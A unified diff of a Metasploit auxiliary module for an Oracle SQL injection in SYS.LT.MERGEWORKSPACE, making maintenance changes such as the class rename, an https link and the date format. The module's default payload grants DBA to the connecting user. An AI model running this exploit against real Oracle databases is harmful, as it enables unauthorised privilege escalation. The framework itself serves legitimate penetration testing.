@@ -1,19 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE',
       'Description'    => %q{
-        This module exploits an sql injection flaw in the MERGEWORKSPACE
+        This module exploits a sql injection flaw in the MERGEWORKSPACE
         procedure of the PL/SQL package SYS.LT. Any user with execute
         privilege on the vulnerable package can exploit this vulnerability.
       },
@@ -27,12 +24,12 @@ class Metasploit3 < Msf::Auxiliary
           [ 'URL', 'http://www.dsecrg.com/pages/expl/show.php?id=23' ]
 
         ],
-      'DisclosureDate' => 'Oct 22 2008'))
+      'DisclosureDate' => '2008-10-22'))
 
       register_options(
         [
           OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-        ], self.class)
+        ])
   end
 
   def run
@@ -100,5 +97,4 @@ class Metasploit3 < Msf::Auxiliary
     prepare_exec(clean)
 
   end
-
 end
